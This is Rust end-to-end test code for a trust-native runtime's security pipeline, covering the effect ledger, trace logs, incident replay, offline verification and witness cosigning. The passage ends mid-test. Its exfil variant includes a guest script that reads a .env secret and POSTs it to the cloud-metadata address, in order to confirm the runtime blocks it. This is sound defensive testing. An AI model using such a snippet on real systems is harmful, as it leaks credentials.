//! bd-f5b04.8.1 — MASTER MOCK-FREE TNR PIPELINE E2E (single trace-id).
//!
//! Walks ONE real operation through every trust-native-runtime layer that is
//! wired into the product today, asserting at each hop that the layers
//! actually compose — no mocks, no stubs, no synthetic verdicts:
//!
//!   L1 RUN      `franken-node run` (subprocess, in-process native engine)
//!               executes a real app doing fs.writeFileSync + fs.readFileSync
//!               + http.get; real bytes hit disk, a real loopback socket
//!               observes the egress, the exit code derives from the real
//!               containment verdict.
//!   L2 EFFECT   Every host crossing lands in the signed host-effect ledger
//!               (`dispatch.host_effect_ledger` in `run --json`): tamper-
//!               evident hash chain, allowed/denied accounting, sha256 head.
//!   L3 LOG      One `--trace-id` correlates the ordered structured-log
//!               event stream (RUN-001 → RUN-003 → FN-EFFECT-002 per host
//!               crossing → RUN-004 on stderr JSONL).
//!   L4 REPLAY   The run's receipts become incident evidence; `incident
//!               bundle --verify` → `incident replay` (matched, thrice-stable
//!               upstream) → `incident counterfactual --policy strict` all
//!               succeed through the real CLI against the same state root.
//!   L5 VSDK     The public verifier SDK re-derives the effect chain OFFLINE
//!               from the ledger entries alone (zero trust in this runtime).
//!   L6 LTV      The run's receipt chain hashes + the bundle integrity hash
//!               become MMR leaves; the root is re-attested (prefix-proof
//!               chain) and witness-cosigned with a real 2-of-3 Ed25519
//!               threshold; anteriority verifies as-of now and the receipt
//!               appends to the evidence ledger.
//!
//! HONEST SCOPE (verified against source 2026-07-11, bd-f5b04.8.1): the
//! following bead-vision layers are NOT yet reachable from a live `run` and
//! are therefore NOT asserted here — each has a follow-up bead instead of a
//! mock:
//!   * Information-flow labeling IS now wired on the run path (bd-plhag): a
//!     read of a recognized secret file labels its bytes, an egress that
//!     carries those bytes inherits the label, and a denied such egress is a
//!     flow BLOCK the verifier SDK proves as "blocked_before_sink" (asserted
//!     in the exfil variant below). Still open: byte-level PREVENTION of a
//!     secret egress to an SSRF-ALLOWED endpoint (the ledger records+the SDK
//!     detects it, but the runtime does not yet block it — a gate-level
//!     follow-up), following a secret through in-guest transforms (needs
//!     engine-side per-datum lineage), and operator declassification input.
//!   * Bayesian sentinel escalation (`policy::runtime_sentinel` /
//!     `policy::bayesian_diagnostics` are not fed observations by the
//!     dispatcher; containment comes from the engine's expected-loss
//!     selector).
//!   * FN-EFFECT-002 is emitted per ledger entry on the run path (bd-ihtox)
//!     and FN-TTR-001/002 on the incident replay path (bd-x8d9t) — both
//!     pinned by the ordered-event assertions under the pipeline trace id.
//!     FN-EFFECT-001 (receipt STARTED — needs an in-flight emission site
//!     inside the dispatcher) and FN-CAS-* remain registered in
//!     docs/observability/tnr_event_metrics_registry.md but unemitted.
//!
//! Run this lane directly with: `scripts/run_tnr_full_pipeline.sh`

#![cfg(feature = "engine")]

use std::io::{Read, Write};
use std::net::TcpListener;
use std::path::Path;
use std::process::{Command, Output};
use std::time::{Duration, SystemTime, UNIX_EPOCH};

use frankenengine_node::control_plane::mmr_proofs::{
    MMR_ROOT_WITNESS_ARTIFACT_ID, MMR_ROOT_WITNESS_CONNECTOR_ID, MmrCheckpoint,
    MmrRootReattestationChain, MmrRootWitnessReceipt, mmr_root_reattestation,
    mmr_root_witness_artifact, mmr_root_witness_statement, verify_root_reattestation_chain,
    verify_root_witness_anteriority,
};
use frankenengine_node::crypto::ED25519_V1_CRYPTO_SUITE;
use frankenengine_node::observability::evidence_ledger::{EvidenceLedger, LedgerCapacity};
use frankenengine_node::security::threshold_sig::{
    PartialSignature, SignerKey, ThresholdConfig, sign,
};
use frankenengine_node::tools::replay_bundle::{
    EventType, INCIDENT_EVIDENCE_SCHEMA, IncidentEvidenceEvent, IncidentEvidenceMetadata,
    IncidentEvidencePackage, IncidentSeverity,
};
use serde_json::{Value, json};

/// The single trace id that correlates every layer of one pipeline walk.
const CLEAN_TRACE_ID: &str = "tnr-full-pipeline-e2e-clean-7c41";
const EXFIL_TRACE_ID: &str = "tnr-full-pipeline-e2e-exfil-9d02";

/// Path to the binary under test (set by Cargo for integration tests).
fn franken_node_bin() -> &'static str {
    env!("CARGO_BIN_EXE_franken-node")
}

fn layer_pass(layer: &str, detail: &str) {
    println!("[TNR-E2E] {layer:<44} PASS  {detail}");
}

fn run_cli(workspace: &Path, args: &[&str]) -> Output {
    Command::new(franken_node_bin())
        .current_dir(workspace)
        .args(args)
        .output()
        .unwrap_or_else(|err| panic!("failed running `{}`: {err}", args.join(" ")))
}

/// Bootstrap a real operator workspace: `franken-node init` (which
/// synthesizes the fail-closed security defaults), then extend the generated
/// config with the decision-receipt signing key (so `incident bundle` signs
/// bundles) and a loopback allowlist entry (so the guest's http egress to the
/// test sink passes the SSRF gate exactly the way an operator would permit an
/// internal endpoint).
fn bootstrap_workspace(app_src: &str, profile: &str) -> tempfile::TempDir {
    let dir = tempfile::TempDir::new().expect("tempdir");
    std::fs::write(dir.path().join("app.js"), app_src).expect("write fixture app");

    let init = run_cli(
        dir.path(),
        &["init", "--profile", profile, "--out-dir", "."],
    );
    assert!(
        init.status.success(),
        "init must bootstrap the workspace; exit={:?} stderr=\n{}",
        init.status.code(),
        String::from_utf8_lossy(&init.stderr)
    );

    let config_path = dir.path().join("franken_node.toml");
    let mut config = std::fs::read_to_string(&config_path).expect("read init config");
    // Inject the receipt-signing key into the existing [security] section if
    // init generated one; otherwise add the section. Appending a duplicate
    // `[security]` header would be a TOML parse error, hence the split.
    let signing_line = "decision_receipt_signing_key_path = \"keys/receipt-signing.key\"\n";
    if let Some(pos) = config.find("[security]\n") {
        let insert_at = pos + "[security]\n".len();
        config.insert_str(insert_at, signing_line);
    } else {
        config.push_str("\n[security]\n");
        config.push_str(signing_line);
    }
    // init emits an inline `allowlist = []` under [security.network_policy];
    // appending an array-of-tables would redefine the key (TOML error), so
    // replace the inline empty array with the loopback exception in place.
    assert!(
        config.contains("allowlist = []"),
        "init-generated config no longer carries an empty allowlist; \
         update the tnr_full_pipeline_e2e config patch: {config}"
    );
    config = config.replace(
        "allowlist = []",
        "allowlist = [{ host = \"127.0.0.1\", reason = \"tnr full-pipeline e2e: permit the loopback test sink\" }]",
    );
    std::fs::write(&config_path, config).expect("write patched config");

    write_receipt_signing_key(&dir.path().join("keys/receipt-signing.key"));
    dir
}

/// Deterministic test signing key (same convention as incident_cli_e2e):
/// hex-encoded ed25519 seed on disk, matching trust anchor derived below.
fn write_receipt_signing_key(path: &Path) {
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent).expect("create key dir");
    }
    let signing_key = ed25519_dalek::SigningKey::from_bytes(&[0x42_u8; 32]);
    std::fs::write(path, hex::encode(signing_key.to_bytes())).expect("write signing key");
}

fn write_replay_trust_anchor(path: &Path) {
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent).expect("create key dir");
    }
    let signing_key = ed25519_dalek::SigningKey::from_bytes(&[0x42_u8; 32]);
    std::fs::write(path, hex::encode(signing_key.verifying_key().to_bytes()))
        .expect("write replay trust anchor");
}

struct RunReport {
    exit_code: Option<i32>,
    report: Value,
    stderr: String,
}

/// Drive `franken-node run` as a real subprocess with the pipeline's trace id.
///
/// The pipeline tests run under `legacy-risky` because that is the profile
/// that GRANTS `fs:*` and `net:*` at the engine capability layer, which lets
/// the walk exercise the product-layer SSRF gate as the enforcement boundary
/// (allowed loopback vs denied metadata endpoint) with the ledger as the
/// evidence channel. Under `balanced` the engine capability gate itself
/// refuses `fs:write` with a hard interpreter abort — a DIFFERENT, earlier
/// enforcement arm, pinned separately by
/// `tnr_engine_capability_gate_fails_closed_under_balanced`.
fn run_app(workspace: &Path, trace_id: &str, policy: &str) -> RunReport {
    let output = Command::new(franken_node_bin())
        .current_dir(workspace)
        .args([
            "run",
            "app.js",
            "--policy",
            policy,
            "--runtime",
            "franken-engine",
            // With the `engine` feature the native path runs in-process and
            // the engine binary is a presence gate only (never spawned);
            // pointing it at the binary under test is the established
            // convention (see run_console_exit_e2e.rs).
            "--engine-bin",
            franken_node_bin(),
            "--json",
            "--structured-logs-jsonl",
            "--trace-id",
            trace_id,
        ])
        .output()
        .expect("spawn franken-node run");

    let stdout = String::from_utf8_lossy(&output.stdout).into_owned();
    let stderr = String::from_utf8_lossy(&output.stderr).into_owned();
    let report: Value = serde_json::from_str(&stdout).unwrap_or_else(|err| {
        panic!("run --json stdout must be pure JSON ({err}); stdout:\n{stdout}\nstderr:\n{stderr}")
    });
    RunReport {
        exit_code: output.status.code(),
        report,
        stderr,
    }
}

/// Parse the structured-log JSONL stream from stderr into (event_code,
/// trace_id) pairs, in emission order.
fn structured_events(stderr: &str) -> Vec<(String, String)> {
    stderr
        .lines()
        .filter_map(|line| serde_json::from_str::<Value>(line).ok())
        .filter_map(|value| {
            let code = value.get("event_code")?.as_str()?.to_string();
            let trace = value
                .get("trace_id")
                .and_then(Value::as_str)
                .unwrap_or_default()
                .to_string();
            Some((code, trace))
        })
        .collect()
}

/// Assert `expected` appears as an ordered subsequence of the event stream.
fn assert_event_order(events: &[(String, String)], expected: &[&str], trace_id: &str) {
    let mut cursor = 0;
    for (code, trace) in events {
        assert_eq!(
            trace, trace_id,
            "every structured-log event must carry the pipeline trace id; \
             event {code} carried {trace:?}"
        );
        if cursor < expected.len() && code == expected[cursor] {
            cursor += 1;
        }
    }
    assert_eq!(
        cursor,
        expected.len(),
        "expected ordered event-code subsequence {expected:?}, observed {:?}",
        events
            .iter()
            .map(|(code, _)| code.as_str())
            .collect::<Vec<_>>()
    );
}

/// Synthesize the incident evidence package FROM the real run outputs: one
/// evidence event per signed effect receipt, chained parent→child in ledger
/// order, with the full receipt JSON as the event payload. This is evidence
/// ASSEMBLY (the operator's collection step), not mocking — every payload
/// byte originated in the live run above.
fn write_incident_evidence_from_ledger(
    path: &Path,
    incident_id: &str,
    trace_id: &str,
    ledger: &Value,
) -> usize {
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent).expect("create evidence dir");
    }
    let entries = ledger["entries"].as_array().expect("ledger entries array");
    assert!(
        !entries.is_empty(),
        "ledger must carry at least one receipt"
    );

    let mut events = Vec::with_capacity(entries.len());
    let mut refs = Vec::with_capacity(entries.len());
    for (idx, entry) in entries.iter().enumerate() {
        let event_id = format!("evt-{:03}", idx + 1);
        let reference = format!("refs/effects/{event_id}.json");
        events.push(IncidentEvidenceEvent {
            event_id: event_id.clone(),
            timestamp: format!("2026-07-11T10:00:{:02}.000000Z", idx.min(59)),
            event_type: EventType::PolicyEval,
            payload: json!({
                "effect_receipt_chain_entry": entry,
                "chain_hash": entry["chain_hash"],
            }),
            provenance_ref: reference.clone(),
            parent_event_id: idx.checked_sub(1).map(|p| format!("evt-{:03}", p + 1)),
            state_snapshot: None,
            policy_version: None,
        });
        refs.push(reference);
    }

    let package = IncidentEvidencePackage {
        schema_version: INCIDENT_EVIDENCE_SCHEMA.to_string(),
        incident_id: incident_id.to_string(),
        collected_at: "2026-07-11T10:05:00.000000Z".to_string(),
        trace_id: trace_id.to_string(),
        severity: IncidentSeverity::High,
        incident_type: "security".to_string(),
        detector: "tnr-full-pipeline-e2e".to_string(),
        policy_version: "legacy-risky".to_string(),
        initial_state_snapshot: json!({
            "chain_head_hash": ledger["chain_head_hash"],
            "effect_count": ledger["effect_count"],
            "allowed_count": ledger["allowed_count"],
            "denied_count": ledger["denied_count"],
        }),
        events,
        evidence_refs: refs,
        metadata: IncidentEvidenceMetadata {
            title: "TNR full-pipeline e2e evidence assembled from live run receipts".to_string(),
            affected_components: vec!["host-effect-bridge".to_string()],
            tags: vec!["tnr".to_string(), "e2e".to_string()],
        },
    };
    std::fs::write(
        path,
        serde_json::to_string_pretty(&package).expect("serialize evidence package"),
    )
    .expect("write evidence package");
    entries.len()
}

fn parse_replay_result(stderr: &str) -> (bool, usize) {
    let line = stderr
        .lines()
        .find(|line| line.starts_with("incident replay result:"))
        .unwrap_or_else(|| panic!("missing replay result line in stderr:\n{stderr}"));
    let mut matched = None;
    let mut event_count = None;
    for token in line.split_whitespace() {
        if let Some(value) = token.strip_prefix("matched=") {
            matched = Some(value == "true");
        }
        if let Some(value) = token.strip_prefix("event_count=") {
            event_count = Some(value.parse::<usize>().expect("event_count"));
        }
    }
    (
        matched.expect("matched field"),
        event_count.expect("event_count field"),
    )
}

/// Drive the incident CLI chain (bundle --verify → replay → counterfactual
/// --policy strict) over evidence assembled from the run's ledger, returning
/// the bundle's integrity hash for the LTV leg.
fn incident_chain_leg(
    workspace: &Path,
    incident_id: &str,
    trace_id: &str,
    ledger: &Value,
) -> String {
    let evidence_path = workspace
        .join("fixtures/incidents")
        .join(incident_id)
        .join("evidence.v1.json");
    let event_count =
        write_incident_evidence_from_ledger(&evidence_path, incident_id, trace_id, ledger);
    let evidence_arg = evidence_path.to_string_lossy().to_string();

    let bundle_output = run_cli(
        workspace,
        &[
            "incident",
            "bundle",
            "--id",
            incident_id,
            "--evidence-path",
            &evidence_arg,
            "--verify",
        ],
    );
    assert!(
        bundle_output.status.success(),
        "incident bundle failed: {}",
        String::from_utf8_lossy(&bundle_output.stderr)
    );
    let bundle_stderr = String::from_utf8_lossy(&bundle_output.stderr);
    assert!(
        bundle_stderr.contains("bundle integrity: valid"),
        "bundle must self-verify: {bundle_stderr}"
    );
    layer_pass(
        "L4 REPLAY incident bundle --verify",
        &format!("{event_count} receipt-events sealed into {incident_id}.fnbundle"),
    );

    let trust_anchor_path = workspace.join("keys/replay-trust-anchor.pub");
    write_replay_trust_anchor(&trust_anchor_path);
    let trust_anchor_arg = trust_anchor_path.to_string_lossy().to_string();
    let bundle_file = format!("{incident_id}.fnbundle");

    let replay_output = run_cli(
        workspace,
        &[
            "incident",
            "replay",
            "--bundle",
            &bundle_file,
            "--trusted-public-key",
            &trust_anchor_arg,
            "--structured-logs-jsonl",
            "--trace-id",
            trace_id,
        ],
    );
    assert!(
        replay_output.status.success(),
        "incident replay failed: {}",
        String::from_utf8_lossy(&replay_output.stderr)
    );
    let replay_stderr = String::from_utf8_lossy(&replay_output.stderr).into_owned();
    let (matched, replayed_events) = parse_replay_result(&replay_stderr);
    assert!(matched, "replay must re-derive the recorded sequence");
    assert_eq!(
        replayed_events, event_count,
        "replay must cover every receipt-event"
    );
    // bd-x8d9t: the replay lifecycle surfaces as registered FN-TTR events
    // under the SAME trace id as the run that produced the receipts —
    // cross-command trace continuity for the whole pipeline.
    let replay_events = structured_events(&replay_stderr);
    assert_event_order(&replay_events, &["FN-TTR-001", "FN-TTR-002"], trace_id);
    layer_pass(
        "L4 REPLAY incident replay",
        &format!("matched=true event_count={replayed_events} FN-TTR-001→002 on trace"),
    );

    let counterfactual_output = run_cli(
        workspace,
        &[
            "incident",
            "counterfactual",
            "--bundle",
            &bundle_file,
            "--trusted-public-key",
            &trust_anchor_arg,
            "--policy",
            "strict",
            "--json",
        ],
    );
    assert!(
        counterfactual_output.status.success(),
        "incident counterfactual failed: {}",
        String::from_utf8_lossy(&counterfactual_output.stderr)
    );
    let counterfactual_stdout = String::from_utf8_lossy(&counterfactual_output.stdout);
    let counterfactual: Value =
        serde_json::from_str(counterfactual_stdout.trim()).unwrap_or_else(|err| {
            panic!("counterfactual --json must emit JSON ({err}):\n{counterfactual_stdout}")
        });
    assert_eq!(
        counterfactual["schema_version"],
        json!("franken-node/incident-counterfactual-report/v2"),
        "counterfactual report schema pin"
    );
    let total_decisions = counterfactual["total_decisions"]
        .as_u64()
        .expect("total_decisions");
    assert_eq!(
        total_decisions as usize, event_count,
        "counterfactual must re-evaluate every recorded decision"
    );
    layer_pass(
        "L4 REPLAY incident counterfactual --policy strict",
        &format!(
            "total_decisions={total_decisions} changed_decisions={} severity_delta={}",
            counterfactual["changed_decisions"], counterfactual["severity_delta"]
        ),
    );

    // Extract the sealed bundle's integrity hash so the LTV leg can bind the
    // replay artifact into the long-term log alongside the effect chain.
    let bundle_json: Value = serde_json::from_str(
        &std::fs::read_to_string(workspace.join(&bundle_file)).expect("read bundle"),
    )
    .expect("bundle is canonical JSON");
    bundle_json["integrity_hash"]
        .as_str()
        .expect("bundle integrity_hash")
        .to_string()
}

/// Offline verifier-SDK leg: re-derive the effect chain from the `run --json`
/// ledger entries alone — the exact surface an external auditor consumes.
fn verifier_sdk_leg(ledger: &Value) -> String {
    let entries_json = serde_json::to_string(&ledger["entries"]).expect("serialize entries");
    let sdk_entries: Vec<frankenengine_verifier_sdk::bundle::EffectReceiptChainEntry> =
        serde_json::from_str(&entries_json)
            .expect("verifier SDK accepts the run --json ledger wire shape");
    let sdk = frankenengine_verifier_sdk::VerifierSdk::new("verifier://tnr-full-pipeline-e2e");
    let verdict = sdk
        .verify_effect_chain_entries(&sdk_entries)
        .expect("verifier SDK re-derives the effect chain offline");
    let ledger_head = ledger["chain_head_hash"].as_str().expect("chain head");
    assert_eq!(
        verdict.head_chain_hash, ledger_head,
        "offline re-derived head must match the runtime's chain head"
    );
    assert_eq!(
        verdict.effect_count as u64,
        ledger["effect_count"].as_u64().unwrap()
    );
    layer_pass(
        "L5 VSDK offline effect-chain re-derivation",
        &format!("head={}…", &ledger_head[..24.min(ledger_head.len())]),
    );
    ledger_head.to_string()
}

fn witness_signing_key(index: u8) -> ed25519_dalek::SigningKey {
    // Deterministic distinct seeds for the 3 independent witnesses.
    ed25519_dalek::SigningKey::from_bytes(&[0x51 + index; 32])
}

/// In-process LTV leg (no CLI surface exists yet — bd follow-up filed): the
/// run's receipt chain hashes plus the bundle integrity hash become MMR
/// leaves; the root is re-attested via a real prefix proof and cosigned by a
/// real 2-of-3 Ed25519 witness threshold; anteriority verifies as-of now and
/// the receipt appends to the evidence ledger.
fn ltv_leg(ledger: &Value, bundle_integrity_hash: &str, trace_id: &str) {
    let entries = ledger["entries"].as_array().expect("ledger entries");
    let mut leaves: Vec<String> = entries
        .iter()
        .map(|entry| {
            entry["chain_hash"]
                .as_str()
                .expect("chain_hash")
                .to_string()
        })
        .collect();
    leaves.push(bundle_integrity_hash.to_string());
    assert!(leaves.len() >= 2, "LTV leg needs at least two leaves");

    // Prefix checkpoint = effect chain only; super checkpoint additionally
    // commits the sealed bundle. The prefix proof shows the log only grew.
    let mut prefix_checkpoint = MmrCheckpoint::enabled();
    for leaf in &leaves[..leaves.len() - 1] {
        prefix_checkpoint
            .append_marker_hash(leaf)
            .expect("append prefix leaf");
    }
    let mut super_checkpoint = MmrCheckpoint::enabled();
    for leaf in &leaves {
        super_checkpoint
            .append_marker_hash(leaf)
            .expect("append super leaf");
    }

    let now_secs = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .expect("clock")
        .as_secs();

    let reattestation = mmr_root_reattestation(
        &prefix_checkpoint,
        &super_checkpoint,
        now_secs,
        ED25519_V1_CRYPTO_SUITE,
    )
    .expect("re-attest run receipt root under the current root");
    let chain = MmrRootReattestationChain {
        origin_root: prefix_checkpoint.root().expect("prefix root").clone(),
        attestations: vec![reattestation],
    };
    let newest_root = verify_root_reattestation_chain(&chain)
        .expect("re-attestation chain verifies without trusting the producer");
    assert_eq!(
        &newest_root,
        super_checkpoint.root().expect("super root"),
        "chain must land on the super root committing chain + bundle"
    );
    layer_pass(
        "L6 LTV root re-attestation (prefix proof)",
        &format!(
            "leaves={} newest_tree_size={}",
            leaves.len(),
            newest_root.tree_size
        ),
    );

    // Real 2-of-3 witness threshold cosign over the canonical statement.
    let statement =
        mmr_root_witness_statement(&newest_root, now_secs, "tnr-e2e-witnesses", "ltv-policy-v1")
            .expect("witness statement");
    let mut signer_keys = Vec::new();
    let mut signing_keys = Vec::new();
    for index in 0..3_u8 {
        let key = witness_signing_key(index);
        signer_keys.push(SignerKey {
            key_id: format!("tnr-ltv-witness-{index}"),
            public_key_hex: hex::encode(key.verifying_key().to_bytes()),
        });
        signing_keys.push(key);
    }
    let threshold_config = ThresholdConfig {
        threshold: 2,
        total_signers: 3,
        signer_keys,
    };
    let signatures: Vec<PartialSignature> = signing_keys
        .iter()
        .zip(threshold_config.signer_keys.iter())
        .take(2)
        .map(|(signing_key, signer_key)| {
            sign(
                signing_key,
                &signer_key.key_id,
                MMR_ROOT_WITNESS_ARTIFACT_ID,
                MMR_ROOT_WITNESS_CONNECTOR_ID,
                &statement.content_hash,
            )
        })
        .collect();
    let witness_artifact =
        mmr_root_witness_artifact(&statement, signatures).expect("witness artifact");
    let receipt = MmrRootWitnessReceipt {
        statement,
        threshold_config,
        witness_artifact,
        trace_id: trace_id.to_string(),
        timestamp: "2026-07-11T10:06:00Z".to_string(),
    };

    let verification = verify_root_witness_anteriority(&receipt, now_secs + 1)
        .expect("witnessed root must verify anterior to as-of");
    assert!(verification.valid_signatures >= 2);

    let mut evidence_ledger = EvidenceLedger::new(LedgerCapacity::new(16, 1 << 20));
    evidence_ledger
        .append_mmr_root_witness_receipt(&receipt, now_secs + 1)
        .expect("witness receipt appends as proof-of-anteriority evidence");
    layer_pass(
        "L6 LTV witness cosign + anteriority",
        &format!(
            "valid_signatures={}/{} observed_at<=as_of",
            verification.valid_signatures, verification.threshold
        ),
    );
}

/// The clean pipeline: fs write + fs read + allowed loopback http egress,
/// every layer green, all under one trace id.
#[test]
fn tnr_full_pipeline_clean_run_single_trace_id() {
    // A real loopback sink observes the guest's egress (bound before the run
    // so the connect always finds it listening).
    let listener = TcpListener::bind("127.0.0.1:0").expect("bind loopback sink");
    let addr = listener.local_addr().expect("listener addr");
    let server = std::thread::spawn(move || {
        let (mut stream, _peer) = listener.accept().expect("accept guest egress");
        stream
            .set_read_timeout(Some(Duration::from_secs(10)))
            .expect("read timeout");
        let mut received = Vec::new();
        let _ = stream.read_to_end(&mut received);
        let _ = stream.write_all(
            b"HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 2\r\n\r\nok",
        );
        let _ = stream.flush();
        received
    });

    let app = format!(
        "const fs = require('fs');\n\
         fs.writeFileSync('out.txt', 'tnr-pipeline-payload');\n\
         const data = fs.readFileSync('out.txt');\n\
         console.log('tnr-payload-bytes', data.length);\n\
         require('http').get('http://{addr}/');\n"
    );
    let workspace = bootstrap_workspace(&app, "legacy-risky");
    let run = run_app(workspace.path(), CLEAN_TRACE_ID, "legacy-risky");

    // ---- L1 RUN: real execution, real side effects, verdict-derived exit.
    assert_eq!(
        run.exit_code,
        Some(0),
        "clean run must exit 0 (containment Allow); stderr:\n{}",
        run.stderr
    );
    assert_eq!(run.report["success"], json!(true));
    assert_eq!(run.report["dispatch"]["exit_code"], json!(0));
    let written = std::fs::read_to_string(workspace.path().join("out.txt"))
        .expect("guest fs.writeFileSync must produce real bytes on disk");
    assert_eq!(written, "tnr-pipeline-payload");
    let guest_stdout = run.report["dispatch"]["captured_output"]["stdout"]
        .as_str()
        .expect("captured stdout");
    assert!(
        guest_stdout.contains("tnr-payload-bytes 20"),
        "guest console output must surface the real read-back length: {guest_stdout:?}"
    );
    let receipt_path = run.report["receipt_path"].as_str().expect("receipt_path");
    assert!(
        workspace.path().join(receipt_path).is_file() || Path::new(receipt_path).is_file(),
        "run execution receipt must persist at {receipt_path}"
    );
    layer_pass(
        "L1 RUN real app under native engine",
        "exit=0, fs bytes on disk, console captured, receipt persisted",
    );

    // The loopback sink really observed the engine-framed request.
    let received = server.join().expect("server thread");
    let wire = String::from_utf8_lossy(&received);
    assert!(
        wire.starts_with("GET / HTTP/1.1\r\n"),
        "loopback sink must observe the engine-framed GET, got {wire:?}"
    );
    layer_pass("L1 RUN loopback sink observed egress", "GET / HTTP/1.1");

    // ---- L2 EFFECT: signed host-effect ledger with tamper-evident chain.
    let ledger = run.report["dispatch"]["host_effect_ledger"].clone();
    assert!(
        !ledger.is_null(),
        "native run must surface the host-effect ledger"
    );
    assert_eq!(ledger["schema_version"], json!("host-effect-ledger-v1.0"));
    let kinds: Vec<&str> = ledger["entries"]
        .as_array()
        .expect("entries")
        .iter()
        .map(|entry| entry["receipt"]["effect_kind"].as_str().expect("kind"))
        .collect();
    assert!(
        kinds.contains(&"fs_write")
            && kinds.contains(&"fs_read")
            && kinds.contains(&"http_request"),
        "ledger must carry all three host crossings, got {kinds:?}"
    );
    assert_eq!(
        ledger["allowed_count"], ledger["effect_count"],
        "clean run: every effect allowed"
    );
    assert_eq!(ledger["denied_count"], json!(0));
    let chain_head = ledger["chain_head_hash"].as_str().expect("chain head");
    assert!(chain_head.starts_with("sha256:"));
    layer_pass(
        "L2 EFFECT signed host-effect ledger",
        &format!("effects={} kinds={kinds:?}", ledger["effect_count"]),
    );

    // ---- L3 LOG: ordered event codes, one trace id across the stream. The
    // host crossings surface as registered FN-EFFECT-002 events (bd-ihtox),
    // one per ledger entry, between dispatch (RUN-003) and receipt (RUN-004).
    let events = structured_events(&run.stderr);
    assert_event_order(
        &events,
        &["RUN-001", "RUN-003", "FN-EFFECT-002", "RUN-004"],
        CLEAN_TRACE_ID,
    );
    let effect_events = events
        .iter()
        .filter(|(code, _)| code == "FN-EFFECT-002")
        .count();
    assert_eq!(
        effect_events as u64,
        ledger["effect_count"].as_u64().expect("effect_count"),
        "one FN-EFFECT-002 event per ledger entry"
    );
    layer_pass(
        "L3 LOG ordered RUN-*/FN-EFFECT-002 events, single trace id",
        &format!("events={} effect_events={effect_events}", events.len()),
    );

    // ---- L5 VSDK: offline re-derivation (before replay so the auditor's
    // view is independent of the incident chain).
    verifier_sdk_leg(&ledger);

    // ---- L4 REPLAY: bundle → replay → counterfactual over the run's
    // receipts through the real CLI.
    let bundle_integrity_hash = incident_chain_leg(
        workspace.path(),
        "INC-TNR-CLEAN-0001",
        CLEAN_TRACE_ID,
        &ledger,
    );

    // ---- L6 LTV: MMR re-attestation + witness cosign over chain + bundle.
    ltv_leg(&ledger, &bundle_integrity_hash, CLEAN_TRACE_ID);

    println!(
        "[TNR-E2E] ================ CLEAN PIPELINE: ALL LAYERS PASS (trace_id={CLEAN_TRACE_ID})"
    );
}

/// The contained variant: the guest reads a recognized secret file (`.env`)
/// and attempts to exfiltrate its contents by POSTing them to the
/// cloud-metadata endpoint. Two layered controls fire: the SSRF egress gate
/// denies that endpoint BEFORE any socket opens, and the information-flow lane
/// (bd-plhag) recognizes that the denied egress carries the secret's bytes and
/// records it as a flow BLOCK. The denial is surfaced in the signed ledger
/// (not masked by the exit code); the verifier SDK then proves OFFLINE that
/// the forbidden label was blocked before the sink, and the full downstream
/// pipeline — replay, counterfactual, LTV — runs over that evidence.
#[test]
fn tnr_full_pipeline_denied_exfil_variant_contained() {
    let app = "const fs = require('fs');\n\
               const secret = fs.readFileSync('.env', 'utf8');\n\
               console.log('secret-bytes', secret.length);\n\
               const req = require('http').request('http://169.254.169.254/exfil', { method: 'POST' });\n\
               req.end(secret);\n";
    let workspace = bootstrap_workspace(app, "legacy-risky");
    std::fs::write(
        workspace.path().join(".env"),
        "TNR_FAKE_SECRET=not-a-real-secret-e2e-fixture-abcdef0123456789\n",
    )
    .expect("write fixture secret");

    let run = run_app(workspace.path(), EXFIL_TRACE_ID, "legacy-risky");

    // ---- L1 RUN: denial is containment-neutral (Allow → exit 0); the
    // fail-closed refusal happens pre-socket and lives in the ledger.
    assert_eq!(
        run.exit_code,
        Some(0),
        "a single denied effect must not escalate containment; stderr:\n{}",
        run.stderr
    );
    layer_pass(
        "L1 RUN exfil variant executes under containment",
        "exit=0 (denial surfaced, not masked)",
    );

    // ---- L2 EFFECT: the read is allowed, the egress is denied, the chain
    // stays tamper-evident.
    let ledger = run.report["dispatch"]["host_effect_ledger"].clone();
    assert!(!ledger.is_null(), "ledger must be present");
    let denied = ledger["denied_count"].as_u64().expect("denied_count");
    assert!(
        denied >= 1,
        "the metadata egress must be refused fail-closed: {ledger}"
    );
    let entries = ledger["entries"].as_array().expect("entries");
    let denied_kinds: Vec<&str> = entries
        .iter()
        .filter(|entry| entry["receipt"]["policy_outcome"]["outcome"] != json!("allowed"))
        .map(|entry| entry["receipt"]["effect_kind"].as_str().expect("kind"))
        .collect();
    assert!(
        denied_kinds.contains(&"http_request"),
        "the denied crossing must be the exfil egress, got {denied_kinds:?} in {ledger}"
    );
    layer_pass(
        "L2 EFFECT exfil egress denied in signed ledger",
        &format!("denied_count={denied}"),
    );

    // ---- L2.5 FLOW (bd-plhag): the denied egress carries the secret's bytes,
    // so it is recorded as a flow BLOCK, and the verifier SDK proves offline
    // that the forbidden label was blocked before the sink.
    let secret_commitment =
        frankenengine_node::security::lineage_tracker::secret_file_label_set_commitment();
    let egress = entries
        .iter()
        .find(|entry| entry["receipt"]["effect_kind"] == json!("http_request"))
        .expect("http_request egress receipt");
    assert_eq!(
        egress["receipt"]["flow_policy_verdict"],
        json!("blocked"),
        "the denied secret egress must be a flow block: {egress}"
    );
    assert_eq!(
        egress["receipt"]["label_set_commitment"],
        json!(secret_commitment),
        "the egress must carry the secret label commitment"
    );
    // FN-FLOW-003 (sink blocked) is emitted for the blocked egress under the
    // pipeline trace id.
    let flow_events = structured_events(&run.stderr);
    assert_event_order(&flow_events, &["FN-FLOW-003"], EXFIL_TRACE_ID);
    // Offline non-exfiltration proof over the run's own ledger entries.
    let sdk_entries: Vec<frankenengine_verifier_sdk::bundle::EffectReceiptChainEntry> =
        serde_json::from_str(&serde_json::to_string(&ledger["entries"]).unwrap())
            .expect("verifier SDK accepts the ledger wire shape");
    let sdk = frankenengine_verifier_sdk::VerifierSdk::new("verifier://tnr-full-pipeline-exfil");
    let chain = sdk
        .verify_effect_chain_entries(&sdk_entries)
        .expect("effect chain re-derives offline");
    let claim = frankenengine_verifier_sdk::bundle::NonExfiltrationClaim {
        forbidden_label_set_commitments: vec![secret_commitment],
        external_sink_effect_kinds: vec!["http_request".to_string()],
        allowed_declassification_refs: vec![],
    };
    let non_exfil =
        frankenengine_verifier_sdk::bundle::verify_non_exfiltration_claim_in_report(&chain, &claim)
